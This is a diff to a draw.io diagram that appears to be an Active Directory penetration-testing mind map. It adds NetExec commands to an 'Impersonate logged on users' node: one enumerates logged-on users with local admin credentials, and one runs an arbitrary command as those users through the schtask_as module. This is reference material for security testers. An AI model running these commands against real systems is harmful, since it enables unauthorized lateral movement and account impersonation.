@@ -959,9 +959,11 @@
         <mxCell id="HUgT8opHQEEQBJ-Bt90d-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;Coerce&lt;/div&gt;&lt;div&gt;see Tab from no creds&lt;br&gt;&lt;/div&gt;" vertex="1">
           <mxGeometry height="70" width="163" x="-413" y="1650" as="geometry" />
         </mxCell>
-        <mxCell id="q8jHVZkL6aeL3lm6xcTA-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;Impersonate logged on users&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;nxc&lt;/font&gt;&lt;/div&gt;" vertex="1">
-          <mxGeometry height="60" width="120" x="670" y="490" as="geometry" />
-        </mxCell>
+        <object label="&lt;div&gt;Impersonate logged on users&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;nxc&lt;/font&gt;&lt;/div&gt;" enum="nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; --loggedon-users" exec="nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; -M schtask_as -o USER=&lt;logged-on-user&gt; CMD=&lt;cmd-command&gt;" id="q8jHVZkL6aeL3lm6xcTA-1">
+          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1">
+            <mxGeometry height="60" width="120" x="670" y="490" as="geometry" />
+          </mxCell>
+        </object>
       </root>
     </mxGraphModel>
   </diagram>
